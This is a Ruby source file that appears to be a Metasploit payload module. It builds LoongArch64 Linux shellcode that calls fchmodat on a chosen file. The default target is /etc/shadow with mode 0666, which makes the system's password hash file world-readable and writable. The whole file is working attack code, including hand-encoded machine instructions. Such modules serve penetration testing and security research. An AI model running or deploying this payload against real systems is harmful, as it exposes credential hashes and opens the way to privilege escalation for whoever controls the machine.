# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 48

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Chmod',
        'Description' => 'Runs chmod on the specified file with specified mode.',
        'Author' => 'bcoles',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_LOONGARCH64,
        'References' => [
          ['URL', 'https://man7.org/linux/man-pages/man2/fchmodat.2.html'],
          ['URL', 'https://github.com/bcoles/shellcode/blob/main/loongarch64/chmod/chmod.s'],
        ]
      )
    )
    register_options([
      OptString.new('FILE', [ true, 'Filename to chmod', '/etc/shadow' ]),
      OptString.new('MODE', [ true, 'File mode (octal)', '0666' ], regex: /\A[0-7]+\z/),
    ])
  end

  # @return [String] the full path of the file to be modified
  def chmod_file_path
    datastore['FILE'] || ''
  end

  # @return [Integer] the desired mode for the file
  def mode
    (datastore['MODE'] || '0666').oct
  end

  # @return [Integer] LoongArch64 instruction to load mode into $a2 register
  # Uses ori $a2, $zero, <mode> instruction encoding
  # For example: 0x0386d806 ; ori $a2, $zero, 0x1b6 ; loads 0o666 into $a2
  def chmod_instruction(mode)
    0x03800006 | ((mode & 0xfff) << 10)
  end

  def generate(_opts = {})
    raise ArgumentError, "chmod mode (#{mode}) is greater than maximum mode size (0xFFF)" if mode > 0xFFF

    shellcode = [
      0x02fe7004,  # addi.d $a0, $zero, -100  # AT_FDCWD
      0x18000105,  # pcaddi $a1, 8            # pointer to path
      chmod_instruction(mode), # ori $a2, $zero, <mode>
      0x03800007,  # ori $a3, $zero, 0        # flags
      0x0380d40b,  # ori $a7, $zero, 53       # __NR_fchmodat
      0x002b0101,  # syscall 0x101
      0x03800004,  # ori $a0, $zero, 0        # exit code
      0x0381740b,  # ori $a7, $zero, 93       # __NR_exit
      0x002b0101,  # syscall 0x101
    ].pack('V*')
    shellcode += chmod_file_path + "\x00".b

    # align our shellcode to 4 bytes
    shellcode += "\x00".b while shellcode.bytesize % 4 != 0

    super.to_s + shellcode
  end
end
